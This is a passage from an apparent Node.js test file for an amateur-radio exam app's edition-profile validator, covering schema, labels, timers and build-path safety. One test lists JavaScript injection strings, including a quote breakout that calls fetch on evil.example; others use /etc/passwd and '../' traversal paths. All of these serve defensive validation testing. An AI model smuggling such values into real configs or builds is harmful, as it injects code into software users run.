'use strict';

// Unit tests for scripts/edition-profile.js (Stage 7B -- minimal edition
// profile contract and build-gate validation).
//
// The first block validates the REAL data/edition.json (read-only), including
// two golden compatibility checks against src/storage.js's own real exam-timer
// values and storage/legacy-key names, so the profile can never silently drift
// from actual US runtime behavior. Everything else uses SYNTHETIC in-memory
// fixtures. No test mutates tracked data.

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const ep = require('../../scripts/edition-profile.js');
const poolRegistry = require('../../scripts/pool-registry.js');

const REPO_ROOT = path.join(__dirname, '../..');
const EDITION_REL = 'data/edition.json';

function loadReal() {
  return JSON.parse(fs.readFileSync(path.join(REPO_ROOT, EDITION_REL), 'utf8'));
}

// A minimal valid profile, matching the real data/edition.json's shape.
function makeProfile(overrides) {
  const base = {
    schemaVersion: 1,
    editionKey: 'us-fcc',
    displayName: 'US Ham Exam',
    subtitle: 'FCC Amateur Radio License Study',
    jurisdiction: 'United States',
    authority: {
      regulatorName: 'Federal Communications Commission',
      regulatorAbbreviation: 'FCC',
      poolSourceName: 'National Conference of Volunteer Examiner Coordinators',
      poolSourceAbbreviation: 'NCVEC'
    },
    poolKeys: ['technician', 'general', 'extra'],
    defaultPoolKey: 'technician',
    labels: {
      referenceLabelTemplate: 'FCC reference: {ref}',
      sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
      elementLabelTemplate: 'Element {element}',
      elementTermLabel: 'FCC element'
    },
    examTimerSecondsValues: [0, 900, 1800, 2100, 3000, 3600],
    figurePolicy: { manifestRequired: true, provenanceScheme: 'checksum-pdf' },
    namespacePolicy: {
      storageKey: 'ham-exam-state',
      legacyKeys: ['ham-exam-pool', 'ham-exam-theme', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'],
      cachePrefix: 'ham-exam-'
    },
    build: {
      poolRegistry: 'data/pools.json',
      questionBanks: {
        technician: 'data/technician.json',
        general: 'data/general.json',
        extra: 'data/extra.json'
      },
      figureManifest: 'data/figures.json',
      guideImage: 'assets/portable-radio-outdoors.jpg'
    }
  };
  return Object.assign({}, base, overrides || {});
}

function expectErrors(profile, pattern) {
  const { errors } = ep.validateEditionProfile(profile);
  const matched = errors.filter((e) => pattern.test(e));
  assert.ok(matched.length > 0,
    `expected an error matching ${pattern}, got:\n${errors.join('\n') || '(no errors)'}`);
  return errors;
}

// --------------------------------------------------------------------------
// real data/edition.json
// --------------------------------------------------------------------------

describe('real data/edition.json', () => {
  test('the shipped profile validates with zero errors', () => {
    const profile = loadReal();
    assert.deepEqual(ep.validateEditionProfile(profile), { errors: [] });
    assert.doesNotThrow(() => ep.assertEditionProfile(profile));
  });

  test('the shipped profile records the expected identity', () => {
    const profile = loadReal();
    assert.equal(profile.editionKey, 'us-fcc');
    assert.equal(profile.jurisdiction, 'United States');
    assert.deepEqual(profile.poolKeys, ['technician', 'general', 'extra']);
    assert.equal(profile.defaultPoolKey, 'technician');
  });

  test('poolKeys/defaultPoolKey agree exactly with the pool registry', () => {
    const profile = loadReal();
    assert.deepEqual([...profile.poolKeys].sort(), [...poolRegistry.POOL_KEYS].sort());
    assert.ok(poolRegistry.POOL_KEYS.includes(profile.defaultPoolKey));
  });

  // Golden compatibility check: the profile's declared exam-timer values must
  // not silently drift from src/storage.js's real, currently-enforced set.
  // Stage 7B does not wire the profile into storage.js -- this test is what
  // keeps the two from disagreeing anyway.
  test('examTimerSecondsValues matches src/storage.js exactly', () => {
    const profile = loadReal();
    const storage = require('../../src/storage.js').HAM_EXAM_STORAGE;
    assert.deepEqual(profile.examTimerSecondsValues, storage.EXAM_TIMER_SECONDS_VALUES);
  });

  // Golden compatibility check: namespacePolicy must describe the REAL,
  // currently-live storage/cache names -- never a renamed or aspirational
  // value -- so this profile can never become a misleading source of truth.
  test('namespacePolicy names the real, unchanged US storage/cache identifiers', () => {
    const profile = loadReal();
    const storage = require('../../src/storage.js').HAM_EXAM_STORAGE;
    assert.equal(profile.namespacePolicy.storageKey, storage.STORAGE_KEY);
    assert.ok(profile.namespacePolicy.legacyKeys.includes(storage.LEGACY_POOL_KEY));
    assert.ok(profile.namespacePolicy.legacyKeys.includes(storage.LEGACY_THEME_KEY));
    assert.ok(profile.namespacePolicy.legacyKeys.includes(storage.legacyIndexKey('{poolKey}')));
    assert.ok(profile.namespacePolicy.legacyKeys.includes(storage.legacyBookmarksKey('{poolKey}')));
    assert.equal(profile.namespacePolicy.cachePrefix, 'ham-exam-');
  });

  test('label templates interpolate the field they name', () => {
    const profile = loadReal();
    const rendered = profile.labels.referenceLabelTemplate.replace('{ref}', '97.1');
    assert.equal(rendered, 'FCC reference: 97.1');
    const sourceRendered = profile.labels.sourceLabelTemplate
      .replace('{poolSourceAbbreviation}', profile.authority.poolSourceAbbreviation);
    assert.equal(sourceRendered, 'NCVEC source');
    const elementRendered = profile.labels.elementLabelTemplate.replace('{element}', '2');
    assert.equal(elementRendered, 'Element 2');
  });

  // Stage 7C golden checks: the build inputs must record the EXACT paths
  // scripts/build.js used to hardcode (so the profile is a faithful transfer
  // of the prior constants, not a rename), every declared input must exist
  // on disk, and no absolute path may ever appear.
  test('build inputs record the previously hardcoded US paths, all present on disk, all relative', () => {
    const profile = loadReal();
    assert.deepEqual(profile.build, {
      poolRegistry: 'data/pools.json',
      questionBanks: {
        technician: 'data/technician.json',
        general: 'data/general.json',
        extra: 'data/extra.json'
      },
      figureManifest: 'data/figures.json',
      guideImage: 'assets/portable-radio-outdoors.jpg'
    });
    const all = [
      profile.build.poolRegistry,
      ...poolRegistry.POOL_KEYS.map((k) => profile.build.questionBanks[k]),
      ...(profile.build.figureManifest ? [profile.build.figureManifest] : []),
      ...(profile.build.guideImage ? [profile.build.guideImage] : [])
    ];
    for (const rel of all) {
      assert.ok(!path.isAbsolute(rel), `${rel} must be relative`);
      assert.equal(ep.validateBuildRelPath(rel), null, `${rel} must pass the path-safety check`);
      assert.ok(fs.existsSync(path.join(REPO_ROOT, rel)), `${rel} must exist on disk`);
    }
  });
});

// --------------------------------------------------------------------------
// synthetic malformed profiles
// --------------------------------------------------------------------------

describe('malformed profiles (synthetic)', () => {
  test('a non-object root is rejected', () => {
    expectErrors(null, /root must be a JSON object/);
    expectErrors('not an object', /root must be a JSON object/);
    expectErrors([1, 2, 3], /root must be a JSON object/);
  });

  test('an unknown top-level key is rejected', () => {
    expectErrors(makeProfile({ unexpectedField: 'nope' }), /unknown top-level key\(s\): unexpectedField/);
  });

  test('each missing required field is rejected by name', () => {
    for (const field of ep.REQUIRED_ROOT_KEYS) {
      const profile = makeProfile();
      delete profile[field];
      expectErrors(profile, new RegExp(`missing required field "${field}"`));
    }
  });

  test('a wrong schemaVersion is rejected', () => {
    expectErrors(makeProfile({ schemaVersion: 2 }), /schemaVersion must be 1/);
    expectErrors(makeProfile({ schemaVersion: '1' }), /schemaVersion must be 1/);
  });

  test('an invalid edition key is rejected', () => {
    for (const bad of ['US-FCC', 'us_fcc', 'us fcc', '-us-fcc', 'us-fcc-', 'Us-Fcc', '', '   ', 123]) {
      expectErrors(makeProfile({ editionKey: bad }), /editionKey must be a lowercase, hyphen-separated identifier/);
    }
  });

  test('a valid non-US-looking edition key is accepted by the generic validator', () => {
    // The shape itself does not hardcode "us" -- only the real data/edition.json
    // fixes the value to "us-fcc" (see docs/EDITIONS.md).
    const { errors } = ep.validateEditionProfile(makeProfile({ editionKey: 'in-asoc' }));
    assert.deepEqual(errors, []);
  });

  test('blank/missing displayName, subtitle, or jurisdiction is rejected', () => {
    for (const field of ['displayName', 'subtitle', 'jurisdiction']) {
      expectErrors(makeProfile({ [field]: '   ' }), new RegExp(`${field} must be a non-blank string`));
      expectErrors(makeProfile({ [field]: '' }), new RegExp(`${field} must be a non-blank string`));
    }
  });

  test('a malformed authority object is rejected', () => {
    expectErrors(makeProfile({ authority: 'FCC' }), /authority must be an object/);
    expectErrors(makeProfile({ authority: { regulatorName: 'FCC', extraField: 'x', regulatorAbbreviation: 'FCC', poolSourceName: 'NCVEC', poolSourceAbbreviation: 'NCVEC' } }),
      /authority: unknown key\(s\): extraField/);
    const missingField = makeProfile();
    delete missingField.authority.poolSourceAbbreviation;
    expectErrors(missingField, /authority\.poolSourceAbbreviation must be a non-blank string/);
    const blankField = makeProfile();
    blankField.authority.regulatorName = '  ';
    expectErrors(blankField, /authority\.regulatorName must be a non-blank string/);
  });

  test('a duplicate pool key is rejected', () => {
    expectErrors(makeProfile({ poolKeys: ['technician', 'technician', 'general'] }),
      /poolKeys: duplicate pool key "technician"/);
  });

  test('an unknown pool key (not in the pool registry) is rejected', () => {
    expectErrors(makeProfile({ poolKeys: ['technician', 'general', 'novice'] }),
      /poolKeys: unknown pool key "novice"/);
  });

  test('a missing pool key (present in the registry but absent from the profile) is rejected', () => {
    expectErrors(makeProfile({ poolKeys: ['technician', 'general'] }),
      /poolKeys: missing required pool "extra"/);
  });

  test('an empty poolKeys array is rejected', () => {
    expectErrors(makeProfile({ poolKeys: [] }), /poolKeys must be a non-empty array/);
  });

  test('an invalid default pool key is rejected', () => {
    expectErrors(makeProfile({ defaultPoolKey: 'novice' }),
      /defaultPoolKey "novice" must be one of profile\.poolKeys/);
    expectErrors(makeProfile({ defaultPoolKey: '' }), /defaultPoolKey must be a non-blank string/);
    expectErrors(makeProfile({ defaultPoolKey: 42 }), /defaultPoolKey must be a non-blank string/);
  });

  test('malformed labels are rejected: missing key, unknown key, and a missing placeholder', () => {
    const missingKey = makeProfile();
    delete missingKey.labels.elementLabelTemplate;
    expectErrors(missingKey, /labels\.elementLabelTemplate must be a non-blank string/);

    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: 'FCC reference: {ref}',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element}',
        extraLabel: 'nope'
      }
    }), /labels: unknown key\(s\): extraLabel/);

    const noPlaceholder = makeProfile();
    noPlaceholder.labels.referenceLabelTemplate = 'FCC reference: see the question';
    expectErrors(noPlaceholder, /labels\.referenceLabelTemplate must contain the "\{ref\}" placeholder/);
  });

  // Review finding: the runtime projection converts referenceLabelTemplate/
  // elementLabelTemplate to a PREFIX (buildEditionRuntimeConfig's
  // `.split(placeholder)[0]`) and only ever concatenates that prefix before
  // a dynamic value -- it never reinserts text that followed the
  // placeholder, and a second occurrence of the placeholder can never be
  // resolved either way. These cases prove both defects are now caught.
  test('a duplicate placeholder in any label template is rejected, found-count included', () => {
    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: '{ref} / {ref}',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element}'
      }
    }), /labels\.referenceLabelTemplate must contain the "\{ref\}" placeholder exactly once, found 2/);

    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: 'FCC reference: {ref}',
        sourceLabelTemplate: '{poolSourceAbbreviation} / {poolSourceAbbreviation}',
        elementLabelTemplate: 'Element {element}'
      }
    }), /labels\.sourceLabelTemplate must contain the "\{poolSourceAbbreviation\}" placeholder exactly once, found 2/);

    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: 'FCC reference: {ref}',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element} {element}'
      }
    }), /labels\.elementLabelTemplate must contain the "\{element\}" placeholder exactly once, found 2/);

    // Three occurrences are still reported as a single, accurate count --
    // not three separate "missing" or "duplicate" findings.
    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: '{ref}{ref}{ref}',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element}'
      }
    }), /labels\.referenceLabelTemplate must contain the "\{ref\}" placeholder exactly once, found 3/);
  });

  test('unsupported suffix text after {ref}/{element} is rejected, since the runtime only uses the prefix', () => {
    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: 'Reference: {ref} (official)',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element}'
      }
    }), /labels\.referenceLabelTemplate must end with the "\{ref\}" placeholder, with no text after it/);

    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: 'FCC reference: {ref}',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element} — details'
      }
    }), /labels\.elementLabelTemplate must end with the "\{element\}" placeholder, with no text after it/);

    // A single trailing space after the placeholder is still suffix text --
    // this is a strict, exact endsWith() check, not a trimmed comparison.
    expectErrors(makeProfile({
      labels: {
        referenceLabelTemplate: 'FCC reference: {ref} ',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element}'
      }
    }), /labels\.referenceLabelTemplate must end with the "\{ref\}" placeholder/);
  });

  test('suffix text after {poolSourceAbbreviation} is allowed: the source template is fully resolved, not truncated to a prefix', () => {
    const { errors } = ep.validateEditionProfile(makeProfile({
      labels: {
        referenceLabelTemplate: 'FCC reference: {ref}',
        sourceLabelTemplate: 'Official {poolSourceAbbreviation} question pool',
        elementLabelTemplate: 'Element {element}',
        elementTermLabel: 'FCC element'
      }
    }));
    assert.deepEqual(errors, []);
  });

  test('LABEL_PLACEHOLDER_MUST_BE_FINAL names exactly the two prefix-derived fields', () => {
    assert.deepEqual([...ep.LABEL_PLACEHOLDER_MUST_BE_FINAL].sort(),
      ['elementLabelTemplate', 'referenceLabelTemplate']);
  });

  test('invalid exam-timer values are rejected: non-integer, negative, and non-ascending/duplicate', () => {
    expectErrors(makeProfile({ examTimerSecondsValues: [] }), /examTimerSecondsValues must be a non-empty array/);
    expectErrors(makeProfile({ examTimerSecondsValues: [0, 900.5, 1800] }),
      /examTimerSecondsValues\[1\] must be a non-negative integer/);
    expectErrors(makeProfile({ examTimerSecondsValues: [0, -900] }),
      /examTimerSecondsValues\[1\] must be a non-negative integer/);
    expectErrors(makeProfile({ examTimerSecondsValues: [900, 0] }),
      /examTimerSecondsValues must be strictly ascending/);
    expectErrors(makeProfile({ examTimerSecondsValues: [0, 900, 900] }),
      /examTimerSecondsValues must be strictly ascending/);
  });

  test('an invalid optional figurePolicy is rejected, but an absent one is valid', () => {
    expectErrors(makeProfile({ figurePolicy: 'yes' }), /figurePolicy must be an object when present/);
    expectErrors(makeProfile({ figurePolicy: { manifestRequired: 'yes', provenanceScheme: 'checksum-pdf' } }),
      /figurePolicy\.manifestRequired must be a boolean/);
    expectErrors(makeProfile({ figurePolicy: { manifestRequired: true, provenanceScheme: 'trust-me' } }),
      /figurePolicy\.provenanceScheme must be one of/);
    expectErrors(makeProfile({ figurePolicy: { manifestRequired: true, provenanceScheme: 'checksum-pdf', extra: 1 } }),
      /figurePolicy: unknown key\(s\): extra/);

    const withoutFigurePolicy = makeProfile();
    delete withoutFigurePolicy.figurePolicy;
    assert.deepEqual(ep.validateEditionProfile(withoutFigurePolicy), { errors: [] },
      'figurePolicy is the one optional field -- an edition with no figures may omit it entirely');
  });

  test('a malformed namespacePolicy is rejected', () => {
    expectErrors(makeProfile({ namespacePolicy: 'ham-exam-' }), /namespacePolicy must be an object/);
    const blankStorageKey = makeProfile();
    blankStorageKey.namespacePolicy.storageKey = '  ';
    expectErrors(blankStorageKey, /namespacePolicy\.storageKey must be a non-blank string/);
    const emptyLegacyKeys = makeProfile();
    emptyLegacyKeys.namespacePolicy.legacyKeys = [];
    expectErrors(emptyLegacyKeys, /namespacePolicy\.legacyKeys must be a non-empty array/);
    const dupLegacyKeys = makeProfile();
    dupLegacyKeys.namespacePolicy.legacyKeys = ['ham-exam-pool', 'ham-exam-pool'];
    expectErrors(dupLegacyKeys, /namespacePolicy\.legacyKeys: duplicate entry "ham-exam-pool"/);
    const blankCachePrefix = makeProfile();
    blankCachePrefix.namespacePolicy.cachePrefix = '';
    expectErrors(blankCachePrefix, /namespacePolicy\.cachePrefix must be a non-blank string/);
    expectErrors(makeProfile({ namespacePolicy: { storageKey: 'ham-exam-state', legacyKeys: ['x'], cachePrefix: 'ham-exam-', extra: 1 } }),
      /namespacePolicy: unknown key\(s\): extra/);
  });

  // Stage 8C: cachePrefix is substituted into src/pwa/sw.js as JS SOURCE
  // TEXT (scripts/build.js), not JSON-safe asInlineScript() embedding, so an
  // unconstrained value is a JS-injection vector into the shipped service
  // worker. CACHE_PREFIX_RE (lowercase/hyphen, trailing hyphen) rejects
  // every string-literal-breaking shape before any dist/ mutation.
  test('cachePrefix rejects quotes, newlines, delimiters, and other malformed shapes', () => {
    const cases = [
      { value: 'x"; fetch("https://evil.example"); //', name: 'double-quote breakout' },
      { value: "x'; fetch('https://evil.example'); //", name: 'single-quote breakout' },
      { value: 'x\\"; alert(1); //', name: 'backslash-escaped quote' },
      { value: 'ham-exam-\nself.foo = 1; //', name: 'embedded newline' },
      { value: 'ham exam ', name: 'space delimiter' },
      { value: 'ham_exam_', name: 'underscore delimiter' },
      { value: 'HAM-EXAM-', name: 'uppercase' },
      { value: 'ham-exam', name: 'missing trailing hyphen' },
      { value: '-ham-exam-', name: 'leading hyphen' },
      { value: 'ham--exam-', name: 'double hyphen' },
      { value: '1ham-exam-', name: 'leading digit' },
      { value: '${process.exit(1)}', name: 'template-literal-shaped' }
    ];
    for (const { value, name } of cases) {
      const { errors } = ep.validateEditionProfile(makeProfile({
        namespacePolicy: Object.assign({}, makeProfile().namespacePolicy, { cachePrefix: value })
      }));
      assert.ok(
        errors.some((e) => /namespacePolicy\.cachePrefix must be lowercase letters\/digits, hyphen-separated, ending in a hyphen/.test(e)),
        `expected cachePrefix ${JSON.stringify(value)} (${name}) to be rejected, got:\n${errors.join('\n') || '(no errors)'}`
      );
    }
    // Empty string is caught by the pre-existing non-blank-string check,
    // named distinctly (not the shape message) -- still a rejection either way.
    expectErrors(makeProfile({
      namespacePolicy: Object.assign({}, makeProfile().namespacePolicy, { cachePrefix: '' })
    }), /namespacePolicy\.cachePrefix must be a non-blank string/);
  });

  test('cachePrefix accepts single- and multi-segment lowercase/hyphen prefixes ending in a hyphen', () => {
    for (const value of ['a-', 'ham-exam-', 'synthetic-exam-', 'in-asoc-2026-']) {
      const { errors } = ep.validateEditionProfile(makeProfile({
        namespacePolicy: Object.assign({}, makeProfile().namespacePolicy, { cachePrefix: value })
      }));
      assert.deepEqual(errors, [], `expected ${JSON.stringify(value)} to validate clean, got:\n${errors.join('\n')}`);
    }
  });

  // Stage 7C: build inputs -- schema, per-pool mapping completeness/identity,
  // and pure path safety (relative, no traversal, no absolute, no backslash).
  test('malformed build inputs are rejected: shape, unknown keys, and missing required fields', () => {
    expectErrors(makeProfile({ build: 'data/pools.json' }), /build must be an object/);
    expectErrors(makeProfile({ build: { poolRegistry: 'data/pools.json', questionBanks: {}, unexpected: 1 } }),
      /build: unknown key\(s\): unexpected/);
    const noRegistry = makeProfile();
    delete noRegistry.build.poolRegistry;
    expectErrors(noRegistry, /build: missing required field "poolRegistry"/);
    const noBanks = makeProfile();
    delete noBanks.build.questionBanks;
    expectErrors(noBanks, /build: missing required field "questionBanks"/);
    expectErrors(makeProfile({ build: { poolRegistry: 'data/pools.json', questionBanks: [] } }),
      /build\.questionBanks must be an object keyed by pool key/);
  });

  test('questionBanks mappings are checked for identity: unknown and missing pool keys, non-string paths', () => {
    const unknownPool = makeProfile();
    unknownPool.build.questionBanks.novice = 'data/novice.json';
    expectErrors(unknownPool, /build\.questionBanks: unknown pool key\(s\): novice/);
    const missingPool = makeProfile();
    delete missingPool.build.questionBanks.extra;
    expectErrors(missingPool, /build\.questionBanks: missing required mapping for pool "extra"/);
    const nonString = makeProfile();
    nonString.build.questionBanks.general = 42;
    expectErrors(nonString, /build\.questionBanks\.general must be a non-blank string/);
  });

  test('unsafe build-input paths are rejected: absolute, traversal, backslash, and wrong extensions', () => {
    const abs = makeProfile();
    abs.build.poolRegistry = '/etc/passwd.json';
    expectErrors(abs, /build\.poolRegistry must be a relative path, not absolute/);
    const winAbs = makeProfile();
    winAbs.build.poolRegistry = 'C:\\data\\pools.json';
    expectErrors(winAbs, /build\.poolRegistry must be a relative path, not absolute/);
    const traversal = makeProfile();
    traversal.build.questionBanks.technician = '../technician.json';
    expectErrors(traversal, /build\.questionBanks\.technician contains an unsafe segment "\.\."/);
    const innerTraversal = makeProfile();
    innerTraversal.build.questionBanks.technician = 'data/../technician.json';
    expectErrors(innerTraversal, /contains an unsafe segment/);
    const backslash = makeProfile();
    backslash.build.figureManifest = 'data\\figures.json';
    expectErrors(backslash, /build\.figureManifest must use forward slashes/);
    const notJson = makeProfile();
    notJson.build.poolRegistry = 'data/pools.txt';
    expectErrors(notJson, /build\.poolRegistry must name a \.json file/);
    const badImage = makeProfile();
    badImage.build.guideImage = 'assets/guide.pdf';
    expectErrors(badImage, /build\.guideImage must name an image file/);
  });

  test('optional build inputs stay optional, but a manifest-required figure policy demands a manifest', () => {
    const minimal = makeProfile();
    delete minimal.build.figureManifest;
    delete minimal.build.guideImage;
    delete minimal.figurePolicy;
    assert.deepEqual(ep.validateEditionProfile(minimal), { errors: [] },
      'an edition with no figures and no guide photo may omit both optional inputs (and figurePolicy) entirely');
    const needsManifest = makeProfile();
    delete needsManifest.build.figureManifest;
    expectErrors(needsManifest, /build\.figureManifest is required because profile\.figurePolicy\.manifestRequired is true/);
  });

  test('assertEditionProfile throws one Error listing every finding', () => {
    const profile = makeProfile({ editionKey: 'BAD', defaultPoolKey: 'novice' });
    assert.throws(() => ep.assertEditionProfile(profile), (err) => {
      assert.match(err.message, /Edition profile validation failed \(2 errors\)/);
      assert.match(err.message, /editionKey must be a lowercase/);
      assert.match(err.message, /defaultPoolKey "novice" must be one of/);
      return true;
    });
  });

  test('a fully valid synthetic profile validates with zero errors', () => {
    assert.deepEqual(ep.validateEditionProfile(makeProfile()), { errors: [] });
  });
});

// --------------------------------------------------------------------------
// Stage 7D: the runtime projection (window.HAM_EXAM_EDITION_CONFIG)
// --------------------------------------------------------------------------

// The exact projection scripts/build.js#buildEditionRuntimeConfig derives
// from the real profile. Mirrored here (not imported) so a silent change to
// the derivation is caught as a test failure rather than absorbed.
function makeRuntimeConfig(overrides) {
  const base = {
    poolKeys: ['technician', 'general', 'extra'],
    defaultPoolKey: 'technician',
    referenceLabelPrefix: 'FCC reference: ',
    elementLabelPrefix: 'Element ',
    sourceLabelText: 'NCVEC source',
    examTimerSecondsValues: [0, 900, 1800, 2100, 3000, 3600],
    displayName: 'US Ham Exam',
    namespacePolicy: {
      storageKey: 'ham-exam-state',
      legacyKeys: ['ham-exam-pool', 'ham-exam-theme', 'ham-exam-index-{poolKey}', 'ham-exam-bookmarks-{poolKey}'],
      cachePrefix: 'ham-exam-'
    },
    elementTermLabel: 'FCC element'
  };
  return Object.assign({}, base, overrides || {});
}

function expectRuntimeErrors(config, pattern) {
  const { errors } = ep.validateEditionRuntimeConfig(config);
  const matched = errors.filter((e) => pattern.test(e));
  assert.ok(matched.length > 0,
    `expected an error matching ${pattern}, got:\n${errors.join('\n') || '(no errors)'}`);
  return errors;
}

describe('runtime projection shape (Stage 7D)', () => {
  test('the expected projection validates with zero errors', () => {
    assert.deepEqual(ep.validateEditionRuntimeConfig(makeRuntimeConfig()), { errors: [] });
    assert.doesNotThrow(() => ep.assertEditionRuntimeConfig(makeRuntimeConfig()));
  });

  test('a non-object root is rejected', () => {
    for (const bad of [null, undefined, 'us-fcc', 42, ['poolKeys']]) {
      expectRuntimeErrors(bad, /root must be an object/);
    }
  });

  // The allowlist is the whole point of a "projection": anything not read by
  // src/app.js must never reach the generated document. A profile field
  // leaking through the derivation shows up here as an unknown key.
  // (Stage 8A2: namespacePolicy is now allowlisted by design -- the one
  // projected field beyond the original seven -- so it is asserted separately
  // below instead of appearing in this must-NOT-project list.)
  test('any non-allowlisted key is rejected, including real profile fields that must NOT be projected', () => {
    for (const leaked of [
      'build', 'figurePolicy', 'authority', 'labels',
      'subtitle', 'jurisdiction', 'schemaVersion', 'editionKey'
    ]) {
      expectRuntimeErrors(makeRuntimeConfig({ [leaked]: 'leaked value' }),
        new RegExp(`unknown key\\(s\\): ${leaked}`));
    }
  });

  test('the allowlist is exactly the seven original fields plus namespacePolicy and elementTermLabel', () => {
    assert.deepEqual([...ep.RUNTIME_CONFIG_KEYS].sort(), [
      'defaultPoolKey', 'displayName', 'elementLabelPrefix', 'elementTermLabel',
      'examTimerSecondsValues', 'namespacePolicy', 'poolKeys',
      'referenceLabelPrefix', 'sourceLabelText'
    ]);
  });

  test('each missing required field is rejected by name', () => {
    // Stage 8A2: namespacePolicy and elementTermLabel are both allowlisted
    // AND required alongside the original seven fields (every valid profile
    // has both, and the build always projects both).
    for (const field of ep.RUNTIME_CONFIG_REQUIRED_KEYS) {
      const config = makeRuntimeConfig();
      delete config[field];
      expectRuntimeErrors(config, new RegExp(`missing required field "${field}"`));
    }
  });

  test('malformed poolKeys are rejected: empty, non-array, duplicate, and non-string entries', () => {
    expectRuntimeErrors(makeRuntimeConfig({ poolKeys: [] }), /poolKeys must be a non-empty array/);
    expectRuntimeErrors(makeRuntimeConfig({ poolKeys: 'technician' }), /poolKeys must be a non-empty array/);
    expectRuntimeErrors(makeRuntimeConfig({ poolKeys: ['technician', 'technician'] }),
      /poolKeys: duplicate pool key "technician"/);
    expectRuntimeErrors(makeRuntimeConfig({ poolKeys: ['technician', 42] }),
      /poolKeys\[1\] must be a non-blank string/);
    expectRuntimeErrors(makeRuntimeConfig({ poolKeys: ['technician', '  '] }),
      /poolKeys\[1\] must be a non-blank string/);
  });

  test('a defaultPoolKey outside poolKeys is rejected', () => {
    expectRuntimeErrors(makeRuntimeConfig({ defaultPoolKey: 'novice' }),
      /defaultPoolKey "novice" must be one of runtimeConfig\.poolKeys/);
    expectRuntimeErrors(makeRuntimeConfig({ defaultPoolKey: '' }),
      /defaultPoolKey must be a non-blank string/);
    expectRuntimeErrors(makeRuntimeConfig({ defaultPoolKey: 42 }),
      /defaultPoolKey must be a non-blank string/);
  });

  test('blank label/display strings are rejected', () => {
    for (const field of ['referenceLabelPrefix', 'elementLabelPrefix', 'sourceLabelText', 'displayName']) {
      expectRuntimeErrors(makeRuntimeConfig({ [field]: '   ' }),
        new RegExp(`${field} must be a non-blank string`));
      expectRuntimeErrors(makeRuntimeConfig({ [field]: null }),
        new RegExp(`${field} must be a non-blank string`));
    }
  });

  test('malformed examTimerSecondsValues are rejected: empty, non-integer, negative, non-ascending', () => {
    expectRuntimeErrors(makeRuntimeConfig({ examTimerSecondsValues: [] }),
      /examTimerSecondsValues must be a non-empty array/);
    expectRuntimeErrors(makeRuntimeConfig({ examTimerSecondsValues: [0, 900.5] }),
      /examTimerSecondsValues\[1\] must be a non-negative integer/);
    expectRuntimeErrors(makeRuntimeConfig({ examTimerSecondsValues: [0, -900] }),
      /examTimerSecondsValues\[1\] must be a non-negative integer/);
    expectRuntimeErrors(makeRuntimeConfig({ examTimerSecondsValues: [900, 0] }),
      /examTimerSecondsValues must be strictly ascending/);
    expectRuntimeErrors(makeRuntimeConfig({ examTimerSecondsValues: [0, 900, 900] }),
      /examTimerSecondsValues must be strictly ascending/);
  });

  test('assertEditionRuntimeConfig throws one Error listing every finding', () => {
    const config = makeRuntimeConfig({ defaultPoolKey: 'novice', displayName: '' });
    assert.throws(() => ep.assertEditionRuntimeConfig(config), (err) => {
      assert.match(err.message, /Edition runtime config validation failed \(2 errors\)/);
      assert.match(err.message, /defaultPoolKey "novice" must be one of/);
      assert.match(err.message, /displayName must be a non-blank string/);
      return true;
    });
  });

  // Golden checks: the projection derived from the REAL profile must match the
  // values src/app.js currently hardcodes as its own fallbacks, so Stage 7D
  // provably changes no US behavior. Each expected value below is the literal
  // string/array that src/app.js falls back to when the config is absent.
  test('the real profile projects exactly the values src/app.js falls back to', () => {
    const profile = loadReal();
    const refPrefix = profile.labels.referenceLabelTemplate
      .split(ep.LABEL_PLACEHOLDERS.referenceLabelTemplate)[0];
    const elPrefix = profile.labels.elementLabelTemplate
      .split(ep.LABEL_PLACEHOLDERS.elementLabelTemplate)[0];
    const sourceText = profile.labels.sourceLabelTemplate
      .replace(ep.LABEL_PLACEHOLDERS.sourceLabelTemplate, profile.authority.poolSourceAbbreviation);

    assert.deepEqual(profile.poolKeys, ['technician', 'general', 'extra']);
    assert.equal(profile.defaultPoolKey, 'technician');
    assert.equal(refPrefix, 'FCC reference: ');
    assert.equal(elPrefix, 'Element ');
    assert.equal(sourceText, 'NCVEC source');
    assert.deepEqual(profile.examTimerSecondsValues, [0, 900, 1800, 2100, 3000, 3600]);
    assert.equal(profile.displayName, 'US Ham Exam');

    // And that whole projection is itself a valid runtime config (Stage 8A2:
    // including the projected namespacePolicy, carried verbatim from the
    // validated profile).
    assert.equal(profile.labels.elementTermLabel, 'FCC element');

    assert.deepEqual(ep.validateEditionRuntimeConfig({
      poolKeys: profile.poolKeys,
      defaultPoolKey: profile.defaultPoolKey,
      referenceLabelPrefix: refPrefix,
      elementLabelPrefix: elPrefix,
      sourceLabelText: sourceText,
      examTimerSecondsValues: profile.examTimerSecondsValues,
      displayName: profile.displayName,
      namespacePolicy: profile.namespacePolicy,
      elementTermLabel: profile.labels.elementTermLabel
    }), { errors: [] });
  });

  // The projection must never carry pool-specific data -- that stays in
  // HAM_EXAM_POOLS (data/pools.json). Asserted against the real registry's
  // own field names so adding a pool field there cannot silently become
  // projectable here.
  test('no pool-specific registry field name is projectable', () => {
    for (const poolField of [
      'expectedCount', 'examQuestionCount', 'passingScore', 'defaultTimeLimitSeconds',
      'groupBlueprint', 'scopeLabels', 'questionIdPrefix', 'withdrawnIds',
      'editionId', 'revisionId', 'element', 'sourceUrl', 'errataLabel'
    ]) {
